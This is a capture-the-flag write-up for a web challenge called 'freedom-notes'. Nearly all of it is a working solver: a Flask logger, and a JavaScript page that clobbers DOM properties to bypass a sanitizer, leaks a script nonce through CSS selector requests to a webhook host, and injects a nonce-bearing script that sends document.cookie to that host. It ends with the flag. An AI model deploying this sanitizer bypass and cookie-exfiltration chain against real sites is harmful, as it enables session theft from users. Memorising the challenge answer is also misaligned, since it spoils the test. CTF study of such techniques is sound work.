# [web] - [freedom-notes]

## Author
nyxmare

## Description
make your notes has freedom, a freedom from sanitizer

## Overview & Solution

- DOM clobbering to bypass sanitizer
- css injection to exfil nonce
- XSS 


### Solver

logger.py
```python
from flask import Flask, request
import requests

NONCE = ""

app = Flask(__name__)
s = requests.Session()

@app.after_request
def add_header(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route("/reset")
def reset():
    global NONCE
    NONCE = ""
    print("[-] Reset NONCE")
    return ""

counter_for_idk = 0
@app.route("/leak")
def leak():
    global NONCE, counter_for_idk
    q = request.args.get('q')
    if q is not None:
        if counter_for_idk == 0:
            print("ignore")
            counter_for_idk += 1
        NONCE += q
        print(f"[-] append NONCE {NONCE}")
    return NONCE

@app.route("/")
def test():
    return "test"

if __name__ == "__main__":
    print("[info] running app ...")
    app.run(host="0.0.0.0", port=1337)
```


solv.html
```html
<script>
    var nonce = "";
    const sleep = (ms) => {
      return new Promise((r) => setTimeout(r, ms));
    };

    const check = async () => {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
          if (this.responseText != "") {
            nonce = this.responseText;
          }
          var src = "http://webapp:8001/#";
          var chars = "abcdefghijklmnopqrstuvwxyz0123456789";

          src += "<form><input name=\"childNodes\"><input name=\"childNodes\"><style>script { display: block }";
          for (var i = 0; i < 36; i++) {
            for (var x = 0; x < 36; x++) {
              // for (var y = 0; y < 36; y++) {
              src +=
                "" +
                "script[nonce^='" +
                nonce +
                chars.charAt(i) +
                chars.charAt(x) /*+ chars.charAt(y)*/ +
                "']:after{" +
                "content: url('http://webhook:1337/leak?q=" +
                chars.charAt(i) +
                chars.charAt(x) /*+ chars.charAt(y)*/ +
                "')" +
                "}" +
                "";
              // }
            }
          }
          src += "</style>";

          if (nonce.length == 32) {
            src =
              "http://webapp:8001/#<form><input name=\"childNodes\"><input name=\"childNodes\"><iframe srcdoc='<script nonce=\"" +
              nonce +
              '">window.location.href=(`//webhook:1337/cookies?${document.cookie}`)<' +
              "/script>'></iframe>";
          }
          window.open(src, "nyx");
          console.log(src);
        }
      };
      await sleep(500);
      xhttp.open("GET", "http://webhook:1337/leak", true);
      xhttp.send();
    };

    (async () => {
      while (1) {
        check();
        await sleep(500);
      }
    })();
  </script>
```


## Flag
`CJ{how_does_it_feel_to_become_free}`